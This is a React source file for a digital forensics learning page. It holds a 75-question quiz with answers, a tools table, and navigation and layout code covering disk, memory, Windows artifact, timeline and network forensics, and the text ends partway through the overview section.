import React, { useState, useEffect } from "react";
import {
  Box,
  Container,
  Typography,
  Paper,
  Chip,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Alert,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  IconButton,
  Tooltip,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  Grid,
  useMediaQuery,
  Drawer,
  Fab,
} from "@mui/material";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import ContentCopyIcon from "@mui/icons-material/ContentCopy";
import SearchIcon from "@mui/icons-material/Search";
import StorageIcon from "@mui/icons-material/Storage";
import MemoryIcon from "@mui/icons-material/Memory";
import FolderIcon from "@mui/icons-material/Folder";
import HistoryIcon from "@mui/icons-material/History";
import BuildIcon from "@mui/icons-material/Build";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import GavelIcon from "@mui/icons-material/Gavel";
import PhoneAndroidIcon from "@mui/icons-material/PhoneAndroid";
import NetworkCheckIcon from "@mui/icons-material/NetworkCheck";
import BugReportIcon from "@mui/icons-material/BugReport";
import DescriptionIcon from "@mui/icons-material/Description";
import QuizIcon from "@mui/icons-material/Quiz";
import MenuIcon from "@mui/icons-material/Menu";
import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
import InfoIcon from "@mui/icons-material/Info";
import DashboardIcon from "@mui/icons-material/Dashboard";
import { Link } from "react-router-dom";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";

const themeColors = {
  primary: "#14b8a6",
  primaryLight: "#2dd4bf",
  secondary: "#f59e0b",
  accent: "#3b82f6",
  bgCard: "#111424",
  bgNested: "#0c0f1c",
  border: "rgba(20, 184, 166, 0.2)",
  textMuted: "#94a3b8",
};

const sectionNavItems = [
  { id: "intro", label: "Introduction", icon: <InfoIcon fontSize="small" /> },
  { id: "overview", label: "Overview", icon: <DashboardIcon fontSize="small" /> },
  { id: "fundamentals", label: "Fundamentals", icon: <GavelIcon fontSize="small" /> },
  { id: "tools", label: "Tools", icon: <BuildIcon fontSize="small" /> },
  { id: "disk-forensics", label: "Disk Forensics", icon: <StorageIcon fontSize="small" /> },
  { id: "memory-forensics", label: "Memory Forensics", icon: <MemoryIcon fontSize="small" /> },
  { id: "windows-artifacts", label: "Windows Artifacts", icon: <FolderIcon fontSize="small" /> },
  { id: "timeline", label: "Timeline", icon: <HistoryIcon fontSize="small" /> },
  { id: "mobile-forensics", label: "Mobile Forensics", icon: <PhoneAndroidIcon fontSize="small" /> },
  { id: "network-forensics", label: "Network Forensics", icon: <NetworkCheckIcon fontSize="small" /> },
  { id: "malware-analysis", label: "Malware Analysis", icon: <BugReportIcon fontSize="small" /> },
  { id: "report-writing", label: "Report Writing", icon: <DescriptionIcon fontSize="small" /> },
  { id: "quiz-section", label: "Knowledge Check", icon: <QuizIcon fontSize="small" /> },
];

const CodeBlock: React.FC<{ code: string; language?: string }> = ({
  code,
  language = "bash",
}) => {
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <Paper
      sx={{
        p: 2,
        bgcolor: themeColors.bgNested,
        borderRadius: 2,
        position: "relative",
        my: 2,
        border: `1px solid ${themeColors.border}`,
      }}
    >
      <Box sx={{ position: "absolute", top: 8, right: 8, display: "flex", gap: 1 }}>
        <Chip label={language} size="small" sx={{ bgcolor: themeColors.primary }} />
        <Tooltip title={copied ? "Copied!" : "Copy"}>
          <IconButton size="small" onClick={handleCopy} sx={{ color: "#fff" }}>
            <ContentCopyIcon fontSize="small" />
          </IconButton>
        </Tooltip>
      </Box>
      <Box
        component="pre"
        sx={{ m: 0, overflow: "auto", fontFamily: "monospace", fontSize: "0.9rem", color: "#e0e0e0", pt: 2 }}
      >
        {code}
      </Box>
    </Paper>
  );
};

const QUIZ_QUESTION_COUNT = 10;
const QUIZ_ACCENT_COLOR = "#14b8a6";
const quizQuestions: QuizQuestion[] = [
  {
    id: 1,
    topic: "Fundamentals",
    question: "Digital forensics is primarily concerned with:",
    options: [
      "Collecting and analyzing electronic evidence",
      "Writing malware",
      "Building web apps",
      "Managing network switches",
    ],
    correctAnswer: 0,
    explanation: "Digital forensics focuses on evidence acquisition and analysis.",
  },
  {
    id: 2,
    topic: "Fundamentals",
    question: "The first principle of forensics is to:",
    options: [
      "Work only on original evidence",
      "Preserve evidence and work on copies",
      "Delete suspicious files",
      "Reinstall the OS",
    ],
    correctAnswer: 1,
    explanation: "Always preserve originals and analyze forensic copies.",
  },
  {
    id: 3,
    topic: "Fundamentals",
    question: "Order of volatility means you should collect:",
    options: [
      "Disk images before memory",
      "Volatile data like RAM before disk",
      "Backups first",
      "Reports first",
    ],
    correctAnswer: 1,
    explanation: "Volatile evidence disappears quickly and must be captured first.",
  },
  {
    id: 4,
    topic: "Fundamentals",
    question: "A forensic image is:",
    options: [
      "A screenshot",
      "A bit-for-bit copy of a storage device",
      "A file backup only",
      "A compressed log file",
    ],
    correctAnswer: 1,
    explanation: "Forensic images capture a full bit-level copy.",
  },
  {
    id: 5,
    topic: "Fundamentals",
    question: "Hashes are used to:",
    options: [
      "Encrypt data",
      "Verify evidence integrity",
      "Recover deleted files",
      "Scan for malware",
    ],
    correctAnswer: 1,
    explanation: "Hashes confirm evidence has not been altered.",
  },
  {
    id: 6,
    topic: "Fundamentals",
    question: "A write blocker prevents:",
    options: [
      "Reading data",
      "Changes to evidence media",
      "Network access",
      "Memory capture",
    ],
    correctAnswer: 1,
    explanation: "Write blockers protect evidence integrity.",
  },
  {
    id: 7,
    topic: "Fundamentals",
    question: "Chain of custody documents:",
    options: [
      "Network routes",
      "Evidence handling history",
      "Patch schedules",
      "User roles",
    ],
    correctAnswer: 1,
    explanation: "Chain of custody tracks who handled evidence and when.",
  },
  {
    id: 8,
    topic: "Fundamentals",
    question: "Why use UTC timestamps?",
    options: [
      "It hides activity",
      "It standardizes timelines across systems",
      "It speeds up imaging",
      "It reduces log size",
    ],
    correctAnswer: 1,
    explanation: "UTC avoids time zone confusion during analysis.",
  },
  {
    id: 9,
    topic: "Fundamentals",
    question: "A false positive in forensics means:",
    options: [
      "Benign artifact interpreted as malicious",
      "Confirmed malicious evidence",
      "A missing log file",
      "A corrupted image",
    ],
    correctAnswer: 0,
    explanation: "False positives are benign artifacts mistaken as malicious.",
  },
  {
    id: 10,
    topic: "Fundamentals",
    question: "Evidence should be collected:",
    options: [
      "Only after remediation",
      "Before making changes to the system",
      "Only when time permits",
      "Only from backups",
    ],
    correctAnswer: 1,
    explanation: "Collect evidence before making changes that could alter it.",
  },
  {
    id: 11,
    topic: "Tools",
    question: "Autopsy is commonly used for:",
    options: [
      "Disk forensics and timeline analysis",
      "Memory capture",
      "Network routing",
      "Password management",
    ],
    correctAnswer: 0,
    explanation: "Autopsy provides disk analysis and timeline features.",
  },
  {
    id: 12,
    topic: "Tools",
    question: "FTK Imager is used to:",
    options: [
      "Create forensic disk images",
      "Capture network traffic",
      "Run YARA rules",
      "Scan antivirus signatures",
    ],
    correctAnswer: 0,
    explanation: "FTK Imager is a common imaging tool.",
  },
  {
    id: 13,
    topic: "Tools",
    question: "Volatility is a framework for:",
    options: [
      "Memory forensics",
      "Disk encryption",
      "Patch management",
      "Firewall policy",
    ],
    correctAnswer: 0,
    explanation: "Volatility analyzes RAM dumps.",
  },
  {
    id: 14,
    topic: "Tools",
    question: "KAPE is designed for:",
    options: [
      "Rapid artifact collection",
      "Network load balancing",
      "Email filtering",
      "Data encryption",
    ],
    correctAnswer: 0,
    explanation: "KAPE quickly collects forensic artifacts.",
  },
  {
    id: 15,
    topic: "Tools",
    question: "Wireshark is used for:",
    options: [
      "Packet capture analysis",
      "Disk imaging",
      "Memory dumping",
      "Registry parsing",
    ],
    correctAnswer: 0,
    explanation: "Wireshark analyzes network captures.",
  },
  {
    id: 16,
    topic: "Tools",
    question: "Plaso/log2timeline helps with:",
    options: [
      "Timeline generation",
      "Disk encryption",
      "Credential storage",
      "Malware execution",
    ],
    correctAnswer: 0,
    explanation: "Plaso builds super timelines from artifacts.",
  },
  {
    id: 17,
    topic: "Tools",
    question: "Sleuth Kit provides:",
    options: [
      "File system analysis utilities",
      "EDR alerts",
      "Network firewalling",
      "Email gateway filtering",
    ],
    correctAnswer: 0,
    explanation: "Sleuth Kit is a file system analysis toolkit.",
  },
  {
    id: 18,
    topic: "Tools",
    question: "Eric Zimmerman tools are commonly used for:",
    options: [
      "Windows artifact analysis",
      "Packet capture",
      "Web app scanning",
      "Disk encryption",
    ],
    correctAnswer: 0,
    explanation: "These tools parse Windows artifacts like Registry and Prefetch.",
  },
  {
    id: 19,
    topic: "Tools",
    question: "YARA is used for:",
    options: [
      "Pattern matching in files or memory",
      "DNS resolution",
      "Route discovery",
      "Patch deployment",
    ],
    correctAnswer: 0,
    explanation: "YARA identifies patterns in malware samples.",
  },
  {
    id: 20,
    topic: "Tools",
    question: "Hashdeep is commonly used to:",
    options: [
      "Compute and compare hashes",
      "Decrypt files",
      "Scan ports",
      "Mount images",
    ],
    correctAnswer: 0,
    explanation: "Hashdeep calculates hashes for verification.",
  },
  {
    id: 21,
    topic: "Disk Forensics",
    question: "NTFS $MFT stores:",
    options: [
      "File metadata records",
      "Browser cookies only",
      "Memory pages",
      "Network routes",
    ],
    correctAnswer: 0,
    explanation: "The Master File Table stores metadata for files.",
  },
  {
    id: 22,
    topic: "Disk Forensics",
    question: "The Windows Registry is useful for:",
    options: [
      "Configuration and persistence artifacts",
      "Packet capture",
      "Disk encryption keys only",
      "Cloud billing",
    ],
    correctAnswer: 0,
    explanation: "Registry keys reveal configuration and persistence.",
  },
  {
    id: 23,
    topic: "Disk Forensics",
    question: "Prefetch files indicate:",
    options: [
      "Program execution history",
      "Password changes",
      "Printer activity",
      "Network routing",
    ],
    correctAnswer: 0,
    explanation: "Prefetch records help show program execution.",
  },
  {
    id: 24,
    topic: "Disk Forensics",
    question: "Shellbags are artifacts that show:",
    options: [
      "Folder access and navigation",
      "Firewall rules",
      "Browser passwords",
      "System updates",
    ],
    correctAnswer: 0,
    explanation: "Shellbags indicate folder browsing activity.",
  },
  {
    id: 25,
    topic: "Disk Forensics",
    question: "The USN Journal tracks:",
    options: [
      "File system changes",
      "Memory allocation",
      "Network connections",
      "User passwords",
    ],
    correctAnswer: 0,
    explanation: "The USN Journal logs file system modifications.",
  },
  {
    id: 26,
    topic: "Disk Forensics",
    question: "LNK files can reveal:",
    options: [
      "Shortcuts and file access history",
      "DNS lookups",
      "Installed patches",
      "Antivirus signatures",
    ],
    correctAnswer: 0,
    explanation: "LNK files include path, timestamps, and file metadata.",
  },
  {
    id: 27,
    topic: "Disk Forensics",
    question: "A common artifact of file deletion is:",
    options: [
      "Entries in unallocated space",
      "Guaranteed removal of all traces",
      "No metadata evidence",
      "Immediate hash changes on backups",
    ],
    correctAnswer: 0,
    explanation: "Deleted files often leave artifacts in unallocated space.",
  },
  {
    id: 28,
    topic: "Disk Forensics",
    question: "File carving is used to:",
    options: [
      "Recover deleted files from raw data",
      "Encrypt files",
      "Change metadata",
      "Patch the OS",
    ],
    correctAnswer: 0,
    explanation: "Carving extracts files from raw disk data.",
  },
  {
    id: 29,
    topic: "Disk Forensics",
    question: "A forensic mount is used to:",
    options: [
      "Access image contents without altering evidence",
      "Encrypt the image",
      "Send logs to SIEM",
      "Disable antivirus",
    ],
    correctAnswer: 0,
    explanation: "Mounting lets you view image contents safely.",
  },
  {
    id: 30,
    topic: "Disk Forensics",
    question: "Why record hash values before and after imaging?",
    options: [
      "To verify image integrity matches the source",
      "To compress the image",
      "To speed imaging",
      "To hide evidence",
    ],
    correctAnswer: 0,
    explanation: "Matching hashes confirm the image is an exact copy.",
  },
  {
    id: 31,
    topic: "Windows Artifacts",
    question: "Windows Event ID 4624 indicates:",
    options: ["Successful logon", "Log cleared", "Service creation", "Power shutdown"],
    correctAnswer: 0,
    explanation: "4624 is a successful logon event.",
  },
  {
    id: 32,
    topic: "Windows Artifacts",
    question: "Windows Event ID 4688 indicates:",
    options: ["Process creation", "Logon failure", "Registry change", "File deletion"],
    correctAnswer: 0,
    explanation: "4688 is process creation with command line details.",
  },
  {
    id: 33,
    topic: "Windows Artifacts",
    question: "Shimcache (AppCompatCache) helps show:",
    options: [
      "Programs executed on the system",
      "Network traffic",
      "Password resets",
      "Patch schedules",
    ],
    correctAnswer: 0,
    explanation: "Shimcache provides evidence of program execution.",
  },
  {
    id: 34,
    topic: "Windows Artifacts",
    question: "Amcache is useful for:",
    options: [
      "Tracking installed and executed programs",
      "Capturing RAM",
      "DNS caching",
      "Firewall rules",
    ],
    correctAnswer: 0,
    explanation: "Amcache stores program execution metadata.",
  },
  {
    id: 35,
    topic: "Windows Artifacts",
    question: "Registry Run keys often indicate:",
    options: ["Persistence mechanisms", "Network latency", "User logoff", "Disk encryption"],
    correctAnswer: 0,
    explanation: "Run keys can auto-start programs at login.",
  },
  {
    id: 36,
    topic: "Windows Artifacts",
    question: "Scheduled tasks are relevant because they:",
    options: ["Provide persistence or automation", "Only configure DNS", "Only handle printing", "Only log system time"],
    correctAnswer: 0,
    explanation: "Tasks can execute programs on a schedule.",
  },
  {
    id: 37,
    topic: "Windows Artifacts",
    question: "Browser history analysis can reveal:",
    options: ["User activity and downloads", "RAM usage", "File system cluster size", "Firewall rules"],
    correctAnswer: 0,
    explanation: "Browser artifacts provide user activity timelines.",
  },
  {
    id: 38,
    topic: "Windows Artifacts",
    question: "Jump lists are artifacts related to:",
    options: ["Recently opened files and folders", "Network sockets", "Memory pages", "Patch deployment"],
    correctAnswer: 0,
    explanation: "Jump lists track recent files for applications.",
  },
  {
    id: 39,
    topic: "Windows Artifacts",
    question: "Timestomping refers to:",
    options: ["Manipulating file timestamps to hide activity", "Encrypting files", "Deleting logs", "Capturing memory"],
    correctAnswer: 0,
    explanation: "Attackers may alter timestamps to evade detection.",
  },
  {
    id: 40,
    topic: "Windows Artifacts",
    question: "Why compare $STANDARD_INFO and $FILE_NAME timestamps?",
    options: [
      "To detect possible timestamp manipulation",
      "To encrypt files",
      "To delete artifacts",
      "To compress images",
    ],
    correctAnswer: 0,
    explanation: "Inconsistencies can indicate tampering.",
  },
  {
    id: 41,
    topic: "Memory Forensics",
    question: "Memory forensics is useful for:",
    options: [
      "Capturing running processes and network connections",
      "Deleting files",
      "Encrypting data",
      "Formatting disks",
    ],
    correctAnswer: 0,
    explanation: "RAM contains active processes and volatile data.",
  },
  {
    id: 42,
    topic: "Memory Forensics",
    question: "A memory dump should be collected:",
    options: ["Before shutting down a system", "After disk wiping", "Only after reboot", "Only after patching"],
    correctAnswer: 0,
    explanation: "Reboots destroy volatile memory evidence.",
  },
  {
    id: 43,
    topic: "Memory Forensics",
    question: "Process injection can be detected by:",
    options: ["Analyzing suspicious memory regions and handles", "Checking only DNS logs", "Reading printer logs", "Running backups"],
    correctAnswer: 0,
    explanation: "Injected code often appears in abnormal memory regions.",
  },
  {
    id: 44,
    topic: "Memory Forensics",
    question: "DLL listing in memory helps identify:",
    options: ["Loaded modules and potential malicious libraries", "Disk partitions", "Network routes", "Email headers"],
    correctAnswer: 0,
    explanation: "Unexpected DLLs can indicate malicious activity.",
  },
  {
    id: 45,
    topic: "Memory Forensics",
    question: "Network connections in RAM can reveal:",
    options: ["Active C2 or data exfil paths", "Disk errors", "USB usage", "Patch status"],
    correctAnswer: 0,
    explanation: "RAM can show active or recent network sessions.",
  },
  {
    id: 46,
    topic: "Memory Forensics",
    question: "Volatility plugins can list:",
    options: ["Processes, modules, and network activity", "Only file names", "Only browser history", "Only firewall rules"],
    correctAnswer: 0,
    explanation: "Volatility provides many plugins for memory analysis.",
  },
  {
    id: 47,
    topic: "Memory Forensics",
    question: "Strings found in memory can indicate:",
    options: ["URLs, commands, or embedded credentials", "Disk geometry", "Printer queues", "BIOS settings"],
    correctAnswer: 0,
    explanation: "Memory can reveal live command lines or URLs.",
  },
  {
    id: 48,
    topic: "Memory Forensics",
    question: "Why analyze memory for malware?",
    options: ["Fileless malware may exist only in RAM", "Memory is always encrypted", "Disk has more data", "RAM never changes"],
    correctAnswer: 0,
    explanation: "Fileless malware often lives only in memory.",
  },
  {
    id: 49,
    topic: "Memory Forensics",
    question: "Hidden processes may indicate:",
    options: ["Rootkit activity", "Normal updates", "User logoff", "Disk cleanup"],
    correctAnswer: 0,
    explanation: "Rootkits can hide processes from normal tools.",
  },
  {
    id: 50,
    topic: "Memory Forensics",
    question: "A memory profile is needed to:",
    options: ["Interpret OS structures correctly", "Encrypt memory", "Delete logs", "Mount disk images"],
    correctAnswer: 0,
    explanation: "Correct profiles match OS version and architecture.",
  },
  {
    id: 51,
    topic: "Timeline",
    question: "Timeline analysis helps to:",
    options: ["Reconstruct event sequences", "Encrypt evidence", "Delete artifacts", "Reset passwords"],
    correctAnswer: 0,
    explanation: "Timelines show what happened and when.",
  },
  {
    id: 52,
    topic: "Timeline",
    question: "Super timelines combine:",
    options: ["Multiple artifact sources into one timeline", "Only registry data", "Only network logs", "Only file hashes"],
    correctAnswer: 0,
    explanation: "Super timelines correlate artifacts across sources.",
  },
  {
    id: 53,
    topic: "Timeline",
    question: "MAC times refer to:",
    options: ["Modified, Accessed, Created timestamps", "Memory, CPU, Cache", "Mail, Audit, Control", "Malware, Alert, Crash"],
    correctAnswer: 0,
    explanation: "MAC times track file modification and access.",
  },
  {
    id: 54,
    topic: "Timeline",
    question: "Timezone normalization is important because:",
    options: ["Systems may log in different time zones", "It encrypts evidence", "It deletes artifacts", "It reduces data size"],
    correctAnswer: 0,
    explanation: "Time normalization ensures consistent timelines.",
  },
  {
    id: 55,
    topic: "Timeline",
    question: "Log correlation helps identify:",
    options: ["Related events across systems", "Disk sector sizes", "User favorites", "Printer queues"],
    correctAnswer: 0,
    explanation: "Correlating logs links actions across hosts.",
  },
  {
    id: 56,
    topic: "Timeline",
    question: "Event logs are useful because they:",
    options: ["Record authentication and system events", "Encrypt files", "Run antivirus", "Create disk images"],
    correctAnswer: 0,
    explanation: "Event logs capture critical activity.",
  },
  {
    id: 57,
    topic: "Timeline",
    question: "When building timelines, you should:",
    options: ["Document data sources and tool versions", "Delete raw logs", "Skip validation", "Ignore time zones"],
    correctAnswer: 0,
    explanation: "Documentation supports reproducibility.",
  },
  {
    id: 58,
    topic: "Timeline",
    question: "A timeline gap may indicate:",
    options: ["Log clearing or missing data", "Normal operation", "Increased security", "Improved backups"],
    correctAnswer: 0,
    explanation: "Gaps can signal tampering or data loss.",
  },
  {
    id: 59,
    topic: "Timeline",
    question: "A reliable timeline should be:",
    options: ["Evidence-based and reproducible", "Speculative", "Only screenshots", "Only memory data"],
    correctAnswer: 0,
    explanation: "Timelines must be supported by evidence.",
  },
  {
    id: 60,
    topic: "Timeline",
    question: "Why correlate timestamps with user context?",
    options: ["To associate actions with accounts", "To hide evidence", "To compress files", "To disable monitoring"],
    correctAnswer: 0,
    explanation: "User context clarifies responsibility and access.",
  },
  {
    id: 61,
    topic: "Network Forensics",
    question: "PCAP files contain:",
    options: ["Captured network packets", "Disk sectors", "Memory pages", "Registry hives"],
    correctAnswer: 0,
    explanation: "PCAPs store raw network traffic.",
  },
  {
    id: 62,
    topic: "Network Forensics",
    question: "DNS logs can reveal:",
    options: ["Command and control domains", "Disk fragmentation", "Password hashes", "System uptime"],
    correctAnswer: 0,
    explanation: "DNS queries often show external communications.",
  },
  {
    id: 63,
    topic: "Network Forensics",
    question: "Netflow data provides:",
    options: ["High-level traffic metadata", "Packet payloads", "Disk images", "Memory dumps"],
    correctAnswer: 0,
    explanation: "Netflow summarizes connections without payloads.",
  },
  {
    id: 64,
    topic: "Network Forensics",
    question: "TLS inspection can help identify:",
    options: ["Malicious domains in encrypted traffic", "Disk corruption", "File hashes", "Registry keys"],
    correctAnswer: 0,
    explanation: "Inspection can surface encrypted traffic destinations.",
  },
  {
    id: 65,
    topic: "Network Forensics",
    question: "Beaconing behavior is:",
    options: ["Regular periodic callbacks to a server", "One-time patch download", "A file copy", "A user logon"],
    correctAnswer: 0,
    explanation: "Beaconing often indicates command and control.",
  },
  {
    id: 66,
    topic: "Mobile Forensics",
    question: "Mobile forensics often examines:",
    options: ["App data, messages, and location artifacts", "Disk sector sizes", "BIOS settings", "Server racks"],
    correctAnswer: 0,
    explanation: "Mobile devices store app, message, and location data.",
  },
  {
    id: 67,
    topic: "Cloud Forensics",
    question: "Cloud forensics relies heavily on:",
    options: ["Provider logs and API audit trails", "Disk write blockers", "BIOS imaging", "Physical drive removal"],
    correctAnswer: 0,
    explanation: "Cloud evidence is typically log and API based.",
  },
  {
    id: 68,
    topic: "Malware Analysis",
    question: "Static malware analysis involves:",
    options: ["Inspecting files without executing them", "Running the malware", "Rebooting servers", "Network capture only"],
    correctAnswer: 0,
    explanation: "Static analysis inspects the file contents safely.",
  },
  {
    id: 69,
    topic: "Malware Analysis",
    question: "Dynamic analysis means:",
    options: ["Executing malware in a controlled environment", "Only hashing files", "Only reading logs", "Only carving files"],
    correctAnswer: 0,
    explanation: "Dynamic analysis observes runtime behavior.",
  },
  {
    id: 70,
    topic: "Malware Analysis",
    question: "A sandbox is used to:",
    options: ["Observe malware behavior safely", "Encrypt files", "Patch systems", "Create backups"],
    correctAnswer: 0,
    explanation: "Sandboxes isolate malware during analysis.",
  },
  {
    id: 71,
    topic: "Reporting",
    question: "A forensic report should be:",
    options: ["Clear, precise, and evidence-backed", "Speculative", "Only screenshots", "Only a timeline"],
    correctAnswer: 0,
    explanation: "Reports must be defensible and evidence-based.",
  },
  {
    id: 72,
    topic: "Reporting",
    question: "Why document tool versions?",
    options: ["For reproducibility and legal defensibility", "To reduce log size", "To hide methods", "To avoid hashing"],
    correctAnswer: 0,
    explanation: "Tool versions matter for repeatability and credibility.",
  },
  {
    id: 73,
    topic: "Reporting",
    question: "A key element of defensible analysis is:",
    options: ["Repeatable methods and evidence citation", "Guessing root cause", "Deleting raw data", "Ignoring time zones"],
    correctAnswer: 0,
    explanation: "Methods must be repeatable and cited.",
  },
  {
    id: 74,
    topic: "Reporting",
    question: "A timeline should be supported by:",
    options: ["Multiple corroborating artifacts", "Only a single log", "Only memory data", "Only email headers"],
    correctAnswer: 0,
    explanation: "Multiple artifacts improve confidence in timelines.",
  },
  {
    id: 75,
    topic: "Reporting",
    question: "What is the safest place to store evidence?",
    options: ["Secure, access-controlled storage with logs", "Shared folder", "Personal laptop", "Public cloud bucket"],
    correctAnswer: 0,
    explanation: "Evidence must be secured with controlled access and auditing.",
  },
];

const DigitalForensicsPage: React.FC = () => {
  const [activeSection, setActiveSection] = useState("intro");
  const [mobileNavOpen, setMobileNavOpen] = useState(false);
  const isMobile = useMediaQuery("(max-width:900px)");

  const scrollToSection = (sectionId: string) => {
    setActiveSection(sectionId);
    const element = document.getElementById(sectionId);
    if (element) {
      const yOffset = -80;
      const y = element.getBoundingClientRect().top + window.pageYOffset + yOffset;
      window.scrollTo({ top: y, behavior: "smooth" });
    }
    setMobileNavOpen(false);
  };

  useEffect(() => {
    const handleScroll = () => {
      const sectionIds = sectionNavItems.map((item) => item.id);
      for (const id of sectionIds) {
        const element = document.getElementById(id);
        if (element) {
          const rect = element.getBoundingClientRect();
          if (rect.top <= 120 && rect.bottom >= 120) {
            setActiveSection(id);
            break;
          }
        }
      }
    };
    window.addEventListener("scroll", handleScroll);
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const sidebarNav = (
    <Box
      sx={{
        position: "sticky",
        top: 90,
        maxHeight: "calc(100vh - 100px)",
        overflowY: "auto",
        pr: 1,
        "&::-webkit-scrollbar": { width: "4px" },
        "&::-webkit-scrollbar-thumb": { bgcolor: themeColors.border, borderRadius: 2 },
      }}
    >
      <Typography variant="overline" sx={{ color: themeColors.textMuted, fontWeight: 600, mb: 1, display: "block" }}>
        ON THIS PAGE
      </Typography>
      <List dense disablePadding>
        {sectionNavItems.map((item) => (
          <ListItem
            key={item.id}
            disablePadding
            sx={{
              mb: 0.5,
              borderRadius: 1,
              bgcolor: activeSection === item.id ? `${themeColors.primary}15` : "transparent",
              borderLeft: activeSection === item.id ? `3px solid ${themeColors.primary}` : "3px solid transparent",
            }}
          >
            <Box
              onClick={() => scrollToSection(item.id)}
              sx={{
                display: "flex",
                alignItems: "center",
                gap: 1,
                py: 0.75,
                px: 1.5,
                cursor: "pointer",
                width: "100%",
                color: activeSection === item.id ? themeColors.primary : themeColors.textMuted,
                "&:hover": { color: themeColors.primary },
                transition: "color 0.2s",
              }}
            >
              {item.icon}
              <Typography variant="body2" sx={{ fontWeight: activeSection === item.id ? 600 : 400 }}>
                {item.label}
              </Typography>
            </Box>
          </ListItem>
        ))}
      </List>
    </Box>
  );

  const tools = [
    { name: "Autopsy", type: "Disk Forensics", platform: "Multi", cost: "Free", best: "Full disk analysis, timeline" },
    { name: "FTK Imager", type: "Imaging", platform: "Windows", cost: "Free", best: "Disk imaging, memory capture" },
    { name: "Volatility 3", type: "Memory Forensics", platform: "Multi", cost: "Free", best: "RAM analysis, malware detection" },
    { name: "Sleuth Kit", type: "CLI Forensics", platform: "Multi", cost: "Free", best: "File system analysis" },
    { name: "KAPE", type: "Triage Collection", platform: "Windows", cost: "Free", best: "Fast artifact collection" },
    { name: "Eric Zimmerman Tools", type: "Windows Artifacts", platform: "Windows", cost: "Free", best: "Registry, prefetch, shellbags" },
    { name: "Velociraptor", type: "DFIR Platform", platform: "Multi", cost: "Free", best: "Endpoint collection at scale" },
    { name: "plaso/log2timeline", type: "Timeline", platform: "Multi", cost: "Free", best: "Super timeline generation" },
    { name: "Wireshark", type: "Network Forensics", platform: "Multi", cost: "Free", best: "PCAP analysis" },
    { name: "Arsenal Image Mounter", type: "Mounting", platform: "Windows", cost: "Free", best: "Mount forensic images" },
  ];

  const pageContext = `This page covers Digital Forensics fundamentals including disk forensics, memory forensics, Windows artifact analysis (Registry, Event Logs, Prefetch, Shellbags, NTFS), timeline analysis, forensic tools like Autopsy, FTK Imager, Volatility, KAPE, and evidence acquisition best practices.`;

  return (
    <LearnPageLayout pageTitle="Digital Forensics Fundamentals" pageContext={pageContext}>
    <Box sx={{ minHeight: "100vh", bgcolor: "#0a0a0f", py: 4 }}>
      <Container maxWidth="xl">
        <Grid container spacing={3}>
          {/* Sidebar Navigation */}
          {!isMobile && (
            <Grid item md={2.5}>
              {sidebarNav}
            </Grid>
          )}

          {/* Main Content */}
          <Grid item xs={12} md={9.5}>
            {/* Introduction Section */}
            <Box id="intro" sx={{ mb: 5 }}>
              <Chip
                component={Link}
                to="/learn"
                icon={<ArrowBackIcon />}
                label="Back to Learning Hub"
                clickable
                variant="outlined"
                sx={{ borderRadius: 2, mb: 2, borderColor: themeColors.border }}
              />
              <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
                <SearchIcon sx={{ fontSize: 40, color: themeColors.primary }} />
                <Typography
                  variant="h3"
                  sx={{
                    fontWeight: 700,
                    background: `linear-gradient(135deg, ${themeColors.primary} 0%, #0d9488 100%)`,
                    backgroundClip: "text",
                    WebkitBackgroundClip: "text",
                    color: "transparent",
                  }}
                >
                  Digital Forensics
                </Typography>
              </Box>
              <Typography variant="h6" sx={{ color: themeColors.textMuted, mb: 2 }}>
                Evidence acquisition, analysis, and incident response fundamentals
              </Typography>
              <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap", mb: 3 }}>
                <Chip icon={<StorageIcon />} label="Disk Forensics" size="small" sx={{ bgcolor: `${themeColors.primary}30` }} />
                <Chip icon={<MemoryIcon />} label="Memory Analysis" size="small" sx={{ bgcolor: `${themeColors.primary}30` }} />
                <Chip icon={<GavelIcon />} label="Chain of Custody" size="small" sx={{ bgcolor: `${themeColors.primary}30` }} />
              </Box>
              <Paper sx={{ p: 3, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
                <Typography variant="h6" sx={{ color: themeColors.primary, mb: 2 }}>
                  What You'll Learn
                </Typography>
                <Grid container spacing={2}>
                  {[
                    "Evidence acquisition and preservation principles",
                    "Disk and memory forensics techniques",
                    "Windows artifact analysis",
                    "Timeline reconstruction",
                    "Mobile and network forensics basics",
                    "Malware analysis fundamentals",
                    "Professional report writing",
                  ].map((item) => (
                    <Grid item xs={12} sm={6} key={item}>
                      <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                        <CheckCircleIcon sx={{ color: themeColors.primary, fontSize: 18 }} />
                        <Typography variant="body2" sx={{ color: themeColors.textMuted }}>{item}</Typography>
                      </Box>
                    </Grid>
                  ))}
                </Grid>
              </Paper>
            </Box>

            {/* Overview Section */}
            <Paper id="overview" sx={{ p: 3, mb: 4, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
              <Typography variant="h5" sx={{ color: themeColors.primary, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <DashboardIcon /> Overview
              </Typography>
              <Grid container spacing={2} sx={{ mb: 3 }}>
                {[
                  { title: "Computer Forensics", desc: "Hard drives, SSDs, file systems, OS artifacts", color: themeColors.accent },
                  { title: "Memory Forensics", desc: "RAM analysis, running processes, malware detection", color: "#8b5cf6" },
                  { title: "Network Forensics", desc: "PCAP analysis, traffic patterns, intrusion detection", color: "#06b6d4" },
                  { title: "Mobile Forensics", desc: "iOS/Android devices, app data, call logs, GPS", color: "#10b981" },
                  { title: "Cloud Forensics", desc: "AWS/Azure/GCP logs, SaaS data, virtual machines", color: themeColors.secondary },
                  { title: "Malware Forensics", desc: "Reverse engineering, behavioral analysis, IOC extraction", color: "#ef4444" },
